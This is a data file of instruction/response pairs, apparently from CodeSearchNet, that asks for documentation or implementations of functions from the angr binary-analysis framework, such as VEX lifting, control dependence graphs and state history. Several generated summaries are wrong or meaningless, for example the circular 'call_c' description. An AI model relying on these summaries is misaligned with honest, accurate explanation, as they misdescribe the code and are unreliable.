{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef process(self, state,\n            irsb=None,\n            skip_stmts=0,\n            last_stmt=99999999,\n            whitelist=None,\n            inline=False,\n            force_addr=None,\n            insn_bytes=None,\n            size=None,\n            num_inst=None,\n            traceflags=0,\n            thumb=False,\n            extra_stop_points=None,\n            opt_level=None,\n            **kwargs):\n        \"\"\"\n        :param state:       The state with which to execute\n        :param irsb:        The PyVEX IRSB object to use for execution. If not provided one will be lifted.\n        :param skip_stmts:  The number of statements to skip in processing\n        :param last_stmt:   Do not execute any statements after this statement\n        :param whitelist:   Only execute statements in this set\n        :param inline:      This is an inline execution. Do not bother copying the state.\n        :param force_addr:  Force execution to pretend that we're working at this concrete address\n\n        :param thumb:       Whether the block should be lifted in ARM's THUMB mode.\n        :param extra_stop_points:\n                            An extra set of points at which to break basic blocks\n        :param opt_level:   The VEX optimization level to use.\n        :param insn_bytes:  A string of bytes to use for the block instead of the project.\n        :param size:        The maximum size of the block, in bytes.\n        :param num_inst:    The maximum number of instructions.\n        :param traceflags:  traceflags to be passed to VEX. (default: 0)\n        :returns:           A SimSuccessors object categorizing the block's successors\n        \"\"\"\n        if 'insn_text' in kwargs:\n\n            if insn_bytes is not None:\n                raise SimEngineError(\"You cannot provide both 'insn_bytes' and 'insn_text'!\")\n\n            insn_bytes = \\\n                self.project.arch.asm(kwargs['insn_text'], addr=kwargs.get('addr', 0),\n                                      thumb=thumb, as_bytes=True)\n\n            if insn_bytes is None:\n                raise AngrAssemblyError(\"Assembling failed. Please make sure keystone is installed, and the assembly\"\n                                        \" string is correct.\")\n\n        return super(SimEngineVEX, self).process(state, irsb,\n                skip_stmts=skip_stmts,\n                last_stmt=last_stmt,\n                whitelist=whitelist,\n                inline=inline,\n                force_addr=force_addr,\n                insn_bytes=insn_bytes,\n                size=size,\n                num_inst=num_inst,\n                traceflags=traceflags,\n                thumb=thumb,\n                extra_stop_points=extra_stop_points,\n                opt_level=opt_level)", "response": "Executes the given state and returns a list of SimSuccessors objects."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _handle_statement(self, state, successors, stmt):\n        if type(stmt) == pyvex.IRStmt.IMark:\n            # TODO how much of this could be moved into the imark handler\n            ins_addr = stmt.addr + stmt.delta\n            state.scratch.ins_addr = ins_addr\n\n            # Raise an exception if we're suddenly in self-modifying code\n            for subaddr in range(stmt.len):\n                if subaddr + stmt.addr in state.scratch.dirty_addrs:\n                    raise SimReliftException(state)\n            state._inspect('instruction', BP_AFTER)\n\n            l.debug(\"IMark: %#x\", stmt.addr)\n            state.scratch.num_insns += 1\n            state._inspect('instruction', BP_BEFORE, instruction=ins_addr)\n\n        # process it!\n        try:\n            stmt_handler = self.stmt_handlers[stmt.tag_int]\n        except IndexError:\n            l.error(\"Unsupported statement type %s\", (type(stmt)))\n            if o.BYPASS_UNSUPPORTED_IRSTMT not in state.options:\n                raise UnsupportedIRStmtError(\"Unsupported statement type %s\" % (type(stmt)))\n            state.history.add_event('resilience', resilience_type='irstmt', stmt=type(stmt).__name__, message='unsupported IRStmt')\n            return None\n        else:\n            exit_data = stmt_handler(self, state, stmt)\n\n        # for the exits, put *not* taking the exit on the list of constraints so\n        # that we can continue on. Otherwise, add the constraints\n        if exit_data is not None:\n            l.debug(\"%s adding conditional exit\", self)\n\n            target, guard, jumpkind = exit_data\n\n            # Produce our successor state!\n            # Let SimSuccessors.add_successor handle the nitty gritty details\n\n            cont_state = None\n            exit_state = None\n\n            if o.COPY_STATES not in state.options:\n                # very special logic to try to minimize copies\n                # first, check if this branch is impossible\n                if guard.is_false():\n                    cont_state = state\n                elif o.LAZY_SOLVES not in state.options and not state.solver.satisfiable(extra_constraints=(guard,)):\n                    cont_state = state\n\n                # then, check if it's impossible to continue from this branch\n                elif guard.is_true():\n                    exit_state = state\n                elif o.LAZY_SOLVES not in state.options and not state.solver.satisfiable(extra_constraints=(claripy.Not(guard),)):\n                    exit_state = state\n                else:\n                    exit_state = state.copy()\n                    cont_state = state\n            else:\n                exit_state = state.copy()\n                cont_state = state\n\n            if exit_state is not None:\n                successors.add_successor(exit_state, target, guard, jumpkind,\n                                         exit_stmt_idx=state.scratch.stmt_idx, exit_ins_addr=state.scratch.ins_addr)\n\n            if cont_state is None:\n                return False\n\n            # Do our bookkeeping on the continuing state\n            cont_condition = claripy.Not(guard)\n            cont_state.add_constraints(cont_condition)\n            cont_state.scratch.guard = claripy.And(cont_state.scratch.guard, cont_condition)\n\n        return True", "response": "This function handles the single statement."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nlifts an IRSB. There are many possible valid sets of parameters. You at the very least must pass some source of data, some source of an architecture, and some source of an address. Sources of data in order of priority: insn_bytes, clemory, state Sources of an address, in order of priority: addr, state Sources of an architecture, in order of priority: arch, clemory, state :param state: A state to use as a data source. :param clemory: A cle.memory.Clemory object to use as a data source. :param addr: The address at which to start the block. :param thumb: Whether the block should be lifted in ARM's THUMB mode. :param opt_level: The VEX optimization level to use. The final IR optimization level is determined by (ordered by priority): - Argument opt_level - opt_level is set to 1 if OPTIMIZE_IR exists in state options - self._default_opt_level :param insn_bytes: A string of bytes to use as a data source. :param size: The maximum size of the block, in bytes. :param num_inst: The maximum number of instructions. :param traceflags: traceflags to be passed to VEX. (default: 0) :param strict_block_end: Whether to force blocks to end at all conditional branches (default: false)", "response": "def lift(self,\n             state=None,\n             clemory=None,\n             insn_bytes=None,\n             arch=None,\n             addr=None,\n             size=None,\n             num_inst=None,\n             traceflags=0,\n             thumb=False,\n             extra_stop_points=None,\n             opt_level=None,\n             strict_block_end=None,\n             skip_stmts=False,\n             collect_data_refs=False):\n\n        \"\"\"\n        Lift an IRSB.\n\n        There are many possible valid sets of parameters. You at the very least must pass some\n        source of data, some source of an architecture, and some source of an address.\n\n        Sources of data in order of priority: insn_bytes, clemory, state\n\n        Sources of an address, in order of priority: addr, state\n\n        Sources of an architecture, in order of priority: arch, clemory, state\n\n        :param state:           A state to use as a data source.\n        :param clemory:         A cle.memory.Clemory object to use as a data source.\n        :param addr:            The address at which to start the block.\n        :param thumb:           Whether the block should be lifted in ARM's THUMB mode.\n        :param opt_level:       The VEX optimization level to use. The final IR optimization level is determined by\n                                (ordered by priority):\n                                - Argument opt_level\n                                - opt_level is set to 1 if OPTIMIZE_IR exists in state options\n                                - self._default_opt_level\n        :param insn_bytes:      A string of bytes to use as a data source.\n        :param size:            The maximum size of the block, in bytes.\n        :param num_inst:        The maximum number of instructions.\n        :param traceflags:      traceflags to be passed to VEX. (default: 0)\n        :param strict_block_end:   Whether to force blocks to end at all conditional branches (default: false)\n        \"\"\"\n\n        # phase 0: sanity check\n        if not state and not clemory and not insn_bytes:\n            raise ValueError(\"Must provide state or clemory or insn_bytes!\")\n        if not state and not clemory and not arch:\n            raise ValueError(\"Must provide state or clemory or arch!\")\n        if addr is None and not state:\n            raise ValueError(\"Must provide state or addr!\")\n        if arch is None:\n            arch = clemory._arch if clemory else state.arch\n        if arch.name.startswith(\"MIPS\") and self._single_step:\n            l.error(\"Cannot specify single-stepping on MIPS.\")\n            self._single_step = False\n\n        # phase 1: parameter defaults\n        if addr is None:\n            addr = state.solver.eval(state._ip)\n        if size is not None:\n            size = min(size, VEX_IRSB_MAX_SIZE)\n        if size is None:\n            size = VEX_IRSB_MAX_SIZE\n        if num_inst is not None:\n            num_inst = min(num_inst, VEX_IRSB_MAX_INST)\n        if num_inst is None and self._single_step:\n            num_inst = 1\n        if opt_level is None:\n            if state and o.OPTIMIZE_IR in state.options:\n                opt_level = 1\n            else:\n                opt_level = self._default_opt_level\n        if strict_block_end is None:\n            strict_block_end = self.default_strict_block_end\n        if self._support_selfmodifying_code:\n            if opt_level > 0:\n                if once('vex-engine-smc-opt-warning'):\n                    l.warning(\"Self-modifying code is not always correctly optimized by PyVEX. \"\n                              \"To guarantee correctness, VEX optimizations have been disabled.\")\n                opt_level = 0\n                if state and o.OPTIMIZE_IR in state.options:\n                    state.options.remove(o.OPTIMIZE_IR)\n        if skip_stmts is not True:\n            skip_stmts = False\n\n        use_cache = self._use_cache\n        if skip_stmts or collect_data_refs:\n            # Do not cache the blocks if skip_stmts or collect_data_refs are enabled\n            use_cache = False\n\n        # phase 2: thumb normalization\n        thumb = int(thumb)\n        if isinstance(arch, ArchARM):\n            if addr % 2 == 1:\n                thumb = 1\n            if thumb:\n                addr &= ~1\n        elif thumb:\n            l.error(\"thumb=True passed on non-arm architecture!\")\n            thumb = 0\n\n        # phase 3: check cache\n        cache_key = None\n        if use_cache:\n            cache_key = (addr, insn_bytes, size, num_inst, thumb, opt_level, strict_block_end)\n            if cache_key in self._block_cache:\n                self._block_cache_hits += 1\n                irsb = self._block_cache[cache_key]\n                stop_point = self._first_stoppoint(irsb, extra_stop_points)\n                if stop_point is None:\n                    return irsb\n                else:\n                    size = stop_point - addr\n                    # check the cache again\n                    cache_key = (addr, insn_bytes, size, num_inst, thumb, opt_level, strict_block_end)\n                    if cache_key in self._block_cache:\n                        self._block_cache_hits += 1\n                        return self._block_cache[cache_key]\n                    else:\n                        self._block_cache_misses += 1\n            else:\n                # a special case: `size` is used as the maximum allowed size\n                tmp_cache_key = (addr, insn_bytes, VEX_IRSB_MAX_SIZE, num_inst, thumb, opt_level, strict_block_end)\n                try:\n                    irsb = self._block_cache[tmp_cache_key]\n                    if irsb.size <= size:\n                        self._block_cache_hits += 1\n                        return self._block_cache[tmp_cache_key]\n                except KeyError:\n                    self._block_cache_misses += 1\n\n        # phase 4: get bytes\n        if insn_bytes is not None:\n            buff, size = insn_bytes, len(insn_bytes)\n        else:\n            buff, size = self._load_bytes(addr, size, state, clemory)\n\n        if not buff or size == 0:\n            raise SimEngineError(\"No bytes in memory for block starting at %#x.\" % addr)\n\n        # phase 5: call into pyvex\n        # l.debug(\"Creating pyvex.IRSB of arch %s at %#x\", arch.name, addr)\n        try:\n            for subphase in range(2):\n\n                irsb = pyvex.lift(buff, addr + thumb, arch,\n                                  max_bytes=size,\n                                  max_inst=num_inst,\n                                  bytes_offset=thumb,\n                                  traceflags=traceflags,\n                                  opt_level=opt_level,\n                                  strict_block_end=strict_block_end,\n                                  skip_stmts=skip_stmts,\n                                  collect_data_refs=collect_data_refs,\n                                  )\n\n                if subphase == 0 and irsb.statements is not None:\n                    # check for possible stop points\n                    stop_point = self._first_stoppoint(irsb, extra_stop_points)\n                    if stop_point is not None:\n                        size = stop_point - addr\n                        continue\n\n                if use_cache:\n                    self._block_cache[cache_key] = irsb\n                return irsb\n\n        # phase x: error handling\n        except pyvex.PyVEXError as e:\n            l.debug(\"VEX translation error at %#x\", addr)\n            if isinstance(buff, bytes):\n                l.debug('Using bytes: %r', buff)\n            else:\n                l.debug(\"Using bytes: %r\", pyvex.ffi.buffer(buff, size))\n            raise SimTranslationError(\"Unable to translate bytecode\") from e"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nenumerates the imarks in the block and return the first stop point.", "response": "def _first_stoppoint(self, irsb, extra_stop_points=None):\n        \"\"\"\n        Enumerate the imarks in the block. If any of them (after the first one) are at a stop point, returns the address\n        of the stop point. None is returned otherwise.\n        \"\"\"\n        if self._stop_points is None and extra_stop_points is None and self.project is None:\n            return None\n\n        first_imark = True\n        for stmt in irsb.statements:\n            if type(stmt) is pyvex.stmt.IMark:  # pylint: disable=unidiomatic-typecheck\n                addr = stmt.addr + stmt.delta\n                if not first_imark:\n                    if self.is_stop_point(addr, extra_stop_points):\n                        # could this part be moved by pyvex?\n                        return addr\n                    if stmt.delta != 0 and self.is_stop_point(stmt.addr, extra_stop_points):\n                        return addr\n\n                first_imark = False\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _genenare_callmap_sif(self, filepath):\n        with open(filepath, \"wb\") as f:\n            for src, dst in self.callgraph.edges():\n                f.write(\"%#x\\tDirectEdge\\t%#x\\n\" % (src, dst))", "response": "Generate a sif file from the call map."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the function who has the least address that is greater than or equal to addr.", "response": "def ceiling_func(self, addr):\n        \"\"\"\n        Return the function who has the least address that is greater than or equal to `addr`.\n\n        :param int addr: The address to query.\n        :return:         A Function instance, or None if there is no other function after `addr`.\n        :rtype:          Function or None\n        \"\"\"\n\n        try:\n            next_addr = self._function_map.ceiling_addr(addr)\n            return self._function_map.get(next_addr)\n\n        except KeyError:\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the function who has the greatest address that is less than or equal to addr.", "response": "def floor_func(self, addr):\n        \"\"\"\n        Return the function who has the greatest address that is less than or equal to `addr`.\n\n        :param int addr: The address to query.\n        :return:         A Function instance, or None if there is no other function before `addr`.\n        :rtype:          Function or None\n        \"\"\"\n\n        try:\n            prev_addr = self._function_map.floor_addr(addr)\n            return self._function_map[prev_addr]\n\n        except KeyError:\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef function(self, addr=None, name=None, create=False, syscall=False, plt=None):\n        if addr is not None:\n            try:\n                f = self._function_map.get(addr)\n                if plt is None or f.is_plt == plt:\n                    return f\n            except KeyError:\n                if create:\n                    # the function is not found\n                    f = self._function_map[addr]\n                    if name is not None:\n                        f.name = name\n                    if syscall:\n                        f.is_syscall=True\n                    return f\n        elif name is not None:\n            for func in self._function_map.values():\n                if func.name == name:\n                    if plt is None or func.is_plt == plt:\n                        return func\n\n        return None", "response": "Returns a Function instance from the function manager."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a list of nodes that are control dependent on the given node in the control dependence graph", "response": "def get_dependants(self, run):\n        \"\"\"\n        Return a list of nodes that are control dependent on the given node in the control dependence graph\n        \"\"\"\n        if run in self._graph.nodes():\n            return list(self._graph.successors(run))\n        else:\n            return []"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_guardians(self, run):\n        if run in self._graph.nodes():\n            return list(self._graph.predecessors(run))\n        else:\n            return []", "response": "Returns a list of nodes on whom the specific node is control dependent in the control dependence graph"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _construct(self):\n\n        self._acyclic_cfg = self._cfg.copy()\n        # TODO: Cycle-removing is not needed - confirm it later\n        # The CFG we use should be acyclic!\n        #self._acyclic_cfg.remove_cycles()\n\n        # Pre-process the acyclic CFG\n        self._pre_process_cfg()\n\n        # Construct post-dominator tree\n        self._pd_construct()\n\n        self._graph = networkx.DiGraph()\n\n        # Construct the reversed dominance frontier mapping\n        rdf = compute_dominance_frontier(self._normalized_cfg, self._post_dom)\n\n        for y in self._cfg.graph.nodes():\n            if y not in rdf:\n                continue\n            for x in rdf[y]:\n                self._graph.add_edge(x, y)", "response": "Construct a control dependence graph for the current CFG and the tree that is acyclic."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _pre_process_cfg(self):\n        for _, dst, data in self._acyclic_cfg.graph.edges(data=True):\n            if 'jumpkind' in data and data['jumpkind'] == 'Ijk_FakeRet':\n                all_edges_to_dst = self._acyclic_cfg.graph.in_edges([ dst ], data=True)\n                if not any((s, d) for s, d, da in all_edges_to_dst if da['jumpkind'] != 'Ijk_FakeRet' ):\n                    # All in edges are FakeRets\n                    # Change them to a normal edge\n                    for _, _, data_ in all_edges_to_dst:\n                        data_['jumpkind'] = 'Ijk_Boring'", "response": "Pre - process the acyclic CFG."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _post_process(self):\n        # TODO: Verify its correctness\n        loop_back_edges = self._cfg.get_loop_back_edges()\n        for b1, b2 in loop_back_edges:\n            self._graph.add_edge(b1, b2)", "response": "Add edges to the graph."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nprocessing the post dominator of the BBL.", "response": "def _pd_post_process(self, cfg):\n        \"\"\"\n        Take care of those loop headers/tails where we manually broke their\n        connection to the next BBL\n        \"\"\"\n        loop_back_edges = self._cfg.get_loop_back_edges()\n\n        for b1, b2 in loop_back_edges:\n            # The edge between b1 and b2 is manually broken\n            # The post dominator of b1 should be b2 (or not?)\n\n            successors = list(self._pd_graph_successors(cfg, b1))\n\n            if len(successors) == 0:\n                if b2 in self._post_dom:\n                    self._post_dom.add_edge(b1, b2)\n                else:\n                    _l.debug(\"%s is not in post dominator dict.\", b2)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate a phi variable for variables at the current block.", "response": "def make_phi_node(self, block_addr, *variables):\n        \"\"\"\n        Create a phi variable for variables at block `block_addr`.\n\n        :param int block_addr:  The address of the current block.\n        :param variables:       Variables that the phi variable represents.\n        :return:                The created phi variable.\n        \"\"\"\n\n        existing_phis = set()\n        non_phis = set()\n        for var in variables:\n            if self.is_phi_variable(var):\n                existing_phis.add(var)\n            else:\n                non_phis.add(var)\n        if len(existing_phis) == 1:\n            existing_phi = next(iter(existing_phis))\n            if non_phis.issubset(self.get_phi_subvariables(existing_phi)):\n                return existing_phi\n            else:\n                # Update phi variables\n                self._phi_variables[existing_phi] |= non_phis\n                return existing_phi\n\n        repre = next(iter(variables))\n        repre_type = type(repre)\n        if repre_type is SimRegisterVariable:\n            ident_sort = 'register'\n            a = SimRegisterVariable(repre.reg, repre.size, ident=self.next_variable_ident(ident_sort))\n        elif repre_type is SimMemoryVariable:\n            ident_sort = 'memory'\n            a = SimMemoryVariable(repre.addr, repre.size, ident=self.next_variable_ident(ident_sort))\n        elif repre_type is SimStackVariable:\n            ident_sort = 'stack'\n            a = SimStackVariable(repre.offset, repre.size, ident=self.next_variable_ident(ident_sort))\n        else:\n            raise TypeError('make_phi_node(): Unsupported variable type \"%s\".' % type(repre))\n\n        # Keep a record of all phi variables\n        self._phi_variables[a] = set(variables)\n        self._phi_variables_by_block[block_addr].add(a)\n\n        return a"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_variables(self, sort=None, collapse_same_ident=False):\n\n        variables = [ ]\n\n        if collapse_same_ident:\n            raise NotImplementedError()\n\n        for var in self._variables:\n            if sort == 'stack' and not isinstance(var, SimStackVariable):\n                continue\n            if sort == 'reg' and not isinstance(var, SimRegisterVariable):\n                continue\n            variables.append(var)\n\n        return variables", "response": "Get a list of variables."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_phi_subvariables(self, var):\n\n        if not self.is_phi_variable(var):\n            return set()\n        return self._phi_variables[var]", "response": "Returns a set of sub - variables that phi variable var represents."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting a dict of phi variables and their corresponding variables.", "response": "def get_phi_variables(self, block_addr):\n        \"\"\"\n        Get a dict of phi variables and their corresponding variables.\n\n        :param int block_addr:  Address of the block.\n        :return:                A dict of phi variables of an empty dict if there are no phi variables at the block.\n        :rtype:                 dict\n        \"\"\"\n\n        if block_addr not in self._phi_variables_by_block:\n            return dict()\n        variables = { }\n        for phi in self._phi_variables_by_block[block_addr]:\n            variables[phi] = self._phi_variables[phi]\n        return variables"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef input_variables(self, exclude_specials=True):\n\n        def has_write_access(accesses):\n            return any(acc for acc in accesses if acc.access_type == 'write')\n\n        def has_read_access(accesses):\n            return any(acc for acc in accesses if acc.access_type == 'read')\n\n        input_variables = [ ]\n\n        for variable, accesses in self._variable_accesses.items():\n            if not has_write_access(accesses) and has_read_access(accesses):\n                if not exclude_specials or not variable.category:\n                    input_variables.append(variable)\n\n        return input_variables", "response": "Get all variables that have never been written to."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nassigning default names to all variables.", "response": "def assign_variable_names(self):\n        \"\"\"\n        Assign default names to all variables.\n\n        :return: None\n        \"\"\"\n\n        for var in self._variables:\n            if isinstance(var, SimStackVariable):\n                if var.name is not None:\n                    continue\n                if var.ident.startswith('iarg'):\n                    var.name = 'arg_%x' % var.offset\n                else:\n                    var.name = 's_%x' % (-var.offset)\n                    # var.name = var.ident\n            elif isinstance(var, SimRegisterVariable):\n                if var.name is not None:\n                    continue\n                var.name = var.ident"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_variable_accesses(self, variable, same_name=False):\n\n        if variable.region == 'global':\n            return self.global_manager.get_variable_accesses(variable, same_name=same_name)\n\n        elif variable.region in self.function_managers:\n            return self.function_managers[variable.region].get_variable_accesses(variable, same_name=same_name)\n\n        l.warning('get_variable_accesses(): Region %s is not found.', variable.region)\n        return [ ]", "response": "Get a list of all references to the given variable."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef call_c(self, c_args):\n\n        c_args = c_args.strip()\n        if c_args[0] != \"(\":\n            c_args = \"(\" + c_args\n        if c_args[-1] != \")\":\n            c_args += \")\"\n\n        # Parse arguments\n        content = \"int main() { func%s; }\" % c_args\n        ast = pycparser.CParser().parse(content)\n\n        if not ast.ext or not isinstance(ast.ext[0], pycparser.c_ast.FuncDef):\n            raise AngrCallableError(\"Error in parsing the given C-style argument string.\")\n\n        if not ast.ext[0].body.block_items or not isinstance(ast.ext[0].body.block_items[0], pycparser.c_ast.FuncCall):\n            raise AngrCallableError(\"Error in parsing the given C-style argument string: \"\n                                    \"Cannot find the expected function call.\")\n\n        arg_exprs = ast.ext[0].body.block_items[0].args.exprs\n\n        args = [ ]\n        for expr in arg_exprs:\n            if isinstance(expr, pycparser.c_ast.Constant):\n                # string\n                if expr.type == \"string\":\n                    args.append(expr.value[1:-1])\n                elif expr.type == \"int\":\n                    args.append(int(expr.value))\n                else:\n                    raise AngrCallableError(\"Unsupported expression type %s.\" % expr.type)\n            else:\n                raise AngrCallableError(\"Unsupported expression type %s.\" % type(expr))\n\n        return self.__call__(*args)", "response": "This is a private method that is called by the function that is called by the function."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndiscarding the ancestry of this state.", "response": "def trim(self):\n        \"\"\"\n        Discard the ancestry of this state.\n        \"\"\"\n        new_hist = self.copy({})\n        new_hist.parent = None\n        self.state.register_plugin('history', new_hist)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef filter_actions(self, block_addr=None, block_stmt=None, insn_addr=None, read_from=None, write_to=None):\n        if read_from is not None:\n            if write_to is not None:\n                raise ValueError(\"Can't handle read_from and write_to at the same time!\")\n            if read_from in ('reg', 'mem'):\n                read_type = read_from\n                read_offset = None\n            elif isinstance(read_from, str):\n                read_type = 'reg'\n                read_offset = self.state.project.arch.registers[read_from][0]\n            else:\n                read_type = 'mem'\n                read_offset = read_from\n        if write_to is not None:\n            if write_to in ('reg', 'mem'):\n                write_type = write_to\n                write_offset = None\n            elif isinstance(write_to, str):\n                write_type = 'reg'\n                write_offset = self.state.project.arch.registers[write_to][0]\n            else:\n                write_type = 'mem'\n                write_offset = write_to\n\n        #def addr_of_stmt(bbl_addr, stmt_idx):\n        #    if stmt_idx is None:\n        #        return None\n        #    stmts = self.state.project.factory.block(bbl_addr).vex.statements\n        #    if stmt_idx >= len(stmts):\n        #        return None\n        #    for i in reversed(range(stmt_idx + 1)):\n        #        if stmts[i].tag == 'Ist_IMark':\n        #            return stmts[i].addr + stmts[i].delta\n        #    return None\n\n        def action_reads(action):\n            if action.type != read_type:\n                return False\n            if action.action != 'read':\n                return False\n            if read_offset is None:\n                return True\n            addr = action.addr\n            if isinstance(addr, SimActionObject):\n                addr = addr.ast\n            if isinstance(addr, claripy.ast.Base):\n                if addr.symbolic:\n                    return False\n                addr = self.state.solver.eval(addr)\n            if addr != read_offset:\n                return False\n            return True\n\n        def action_writes(action):\n            if action.type != write_type:\n                return False\n            if action.action != 'write':\n                return False\n            if write_offset is None:\n                return True\n            addr = action.addr\n            if isinstance(addr, SimActionObject):\n                addr = addr.ast\n            if isinstance(addr, claripy.ast.Base):\n                if addr.symbolic:\n                    return False\n                addr = self.state.solver.eval(addr)\n            if addr != write_offset:\n                return False\n            return True\n\n        return [x for x in reversed(self.actions) if\n                    (block_addr is None or x.bbl_addr == block_addr) and\n                    (block_stmt is None or x.stmt_idx == block_stmt) and\n                    (read_from is None or action_reads(x)) and\n                    (write_to is None or action_writes(x)) and\n                    (insn_addr is None or (x.sim_procedure is None and x.ins_addr == insn_addr))\n                    #(insn_addr is None or (x.sim_procedure is None and addr_of_stmt(x.bbl_addr, x.stmt_idx) == insn_addr))\n            ]", "response": "Filter self. actions based on some common parameters."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nfinding the common ancestor between this path history node and other.", "response": "def closest_common_ancestor(self, other):\n        \"\"\"\n        Find the common ancestor between this history node and 'other'.\n\n        :param other:    the PathHistory to find a common ancestor with.\n        :return:        the common ancestor SimStateHistory, or None if there isn't one\n        \"\"\"\n        our_history_iter = reversed(HistoryIter(self))\n        their_history_iter = reversed(HistoryIter(other))\n        sofar = set()\n\n        while True:\n            our_done = False\n            their_done = False\n\n            try:\n                our_next = next(our_history_iter)\n                if our_next in sofar:\n                    # we found it!\n                    return our_next\n                sofar.add(our_next)\n            except StopIteration:\n                # we ran out of items during iteration\n                our_done = True\n\n            try:\n                their_next = next(their_history_iter)\n                if their_next in sofar:\n                    # we found it!\n                    return their_next\n                sofar.add(their_next)\n            except StopIteration:\n                # we ran out of items during iteration\n                their_done = True\n\n            # if we ran out of both lists, there's no common ancestor\n            if our_done and their_done:\n                return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the list of constraints that have been accumulated since other.", "response": "def constraints_since(self, other):\n        \"\"\"\n        Returns the constraints that have been accumulated since `other`.\n\n        :param other: a prior PathHistory object\n        :returns: a list of constraints\n        \"\"\"\n\n        constraints = [ ]\n        cur = self\n        while cur is not other and cur is not None:\n            constraints.extend(cur.recent_constraints)\n            cur = cur.parent\n        return constraints"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncount the number of occurrences of value v in the entire history.", "response": "def count(self, v):\n        \"\"\"\n        Count occurrences of value v in the entire history. Note that the subclass must implement the __reversed__\n        method, otherwise an exception will be thrown.\n        :param object v: The value to look for\n        :return: The number of occurrences\n        :rtype: int\n        \"\"\"\n        ctr = 0\n        for item in reversed(self):\n            if item == v:\n                ctr += 1\n        return ctr"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef slice_graph(graph, node, frontier, include_frontier=False):\n\n        subgraph = networkx.DiGraph()\n\n        for frontier_node in frontier:\n            for simple_path in networkx.all_simple_paths(graph, node, frontier_node):\n                for src, dst in zip(simple_path, simple_path[1:]):\n                    if include_frontier or (src not in frontier and dst not in frontier):\n                        subgraph.add_edge(src, dst)\n        if not list(subgraph.nodes):\n            # HACK: FIXME: for infinite loop nodes, this would return an empty set, so we include the loop body itself\n            # Make sure this makes sense (EDG thinks it does)\n            if (node, node) in graph.edges:\n                subgraph.add_edge(node, node)\n        return subgraph", "response": "Generate a slice of the graph from the given node to the given frontier."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconverting a condition into a lambda that checks if state s current basic block matches some condition.", "response": "def condition_to_lambda(condition, default=False):\n    \"\"\"\n    Translates an integer, set, list or function into a lambda that checks if state's current basic block matches\n    some condition.\n\n    :param condition:   An integer, set, list or lambda to convert to a lambda.\n    :param default:     The default return value of the lambda (in case condition is None). Default: false.\n\n    :returns:           A tuple of two items: a lambda that takes a state and returns the set of addresses that it\n                        matched from the condition, and a set that contains the normalized set of addresses to stop\n                        at, or None if no addresses were provided statically.\n    \"\"\"\n    if condition is None:\n        condition_function = lambda state: default\n        static_addrs = set()\n\n    elif isinstance(condition, int):\n        return condition_to_lambda((condition,))\n\n    elif isinstance(condition, (tuple, set, list)):\n        static_addrs = set(condition)\n        def condition_function(state):\n            if state.addr in static_addrs:\n                # returning {state.addr} instead of True to properly handle find/avoid conflicts\n                return {state.addr}\n\n            if not isinstance(state.project.engines.default_engine, engines.SimEngineVEX):\n                return False\n\n            try:\n                # If the address is not in the set (which could mean it is\n                # not at the top of a block), check directly in the blocks\n                # (Blocks are repeatedly created for every check, but with\n                # the IRSB cache in angr lifter it should be OK.)\n                return static_addrs.intersection(set(state.block().instruction_addrs))\n            except (AngrError, SimError):\n                return False\n\n    elif hasattr(condition, '__call__'):\n        condition_function = condition\n        static_addrs = None\n    else:\n        raise AngrExplorationTechniqueError(\"ExplorationTechnique is unable to convert given type (%s) to a callable condition function.\" % condition.__class__)\n\n    return condition_function, static_addrs"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndetermine a persistent ID for an object.", "response": "def _get_persistent_id(self, o):\n        \"\"\"\n        Determines a persistent ID for an object.\n        Does NOT do stores.\n        \"\"\"\n        if type(o) in self.hash_dedup:\n            oid = o.__class__.__name__ + \"-\" + str(hash(o))\n            self._object_cache[oid] = o\n            return oid\n\n        if any(isinstance(o,c) for c in self.unsafe_key_baseclasses):\n            return None\n\n        try:\n            return self._uuid_cache[o]\n        except KeyError:\n            pass\n        except TypeError:\n            return None\n\n        #if type(o) in self.uuid_dedup:\n        #    return self._get_id(o)\n        if o.__class__.__module__.split('.')[0] in self.module_dedup or o.__class__ in self.uuid_dedup:\n            oid = o.__class__.__name__.split(\".\")[-1] + '-' + str(uuid.uuid4())\n            self._object_cache[oid] = o\n            self._uuid_cache[o] = oid\n            return oid\n\n        return None"}
